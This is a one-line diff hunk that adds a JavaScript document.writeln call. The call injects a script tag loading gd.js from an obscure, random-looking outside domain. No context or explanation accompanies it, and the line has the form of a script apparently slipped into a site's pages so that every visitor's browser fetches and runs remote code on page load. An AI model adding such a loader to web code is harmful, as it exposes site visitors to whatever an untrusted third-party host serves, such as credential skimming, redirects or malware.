@@ -1,0 +1,1 @@
+    document.writeln("<script src='//88yh88qwer.com/js/gd.js'><\/script>");
